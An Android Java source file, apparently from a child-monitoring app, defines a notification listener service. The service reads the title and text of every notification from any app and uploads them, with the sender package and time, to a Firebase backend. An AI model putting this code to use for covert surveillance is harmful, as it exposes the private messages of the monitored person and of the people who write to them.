package com.monitor.child.service;

import android.annotation.SuppressLint;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.monitor.child.manager.FirebaseManager;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
@SuppressLint("OverrideAbstract")
public class NotificationMonitor extends NotificationListenerService {
    private static final String TAG = "NotificationMonitor";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = "";
        String text = "";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            android.app.Notification notification = sbn.getNotification();
            android.os.Bundle extras = notification.extras;

            if (extras != null) {
                CharSequence titleCs = extras.getCharSequence(
                        android.app.Notification.EXTRA_TITLE);
                CharSequence textCs = extras.getCharSequence(
                        android.app.Notification.EXTRA_TEXT);

                if (titleCs != null) title = titleCs.toString();
                if (textCs != null) text = textCs.toString();
            }
        }

        if (!title.isEmpty() || !text.isEmpty()) {
            Log.d(TAG, "Notif from: " + packageName + " | " + title);

            FirebaseManager.getInstance()
                    .uploadNotification(packageName, title, text,
                            sbn.getPostTime());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
    }
}
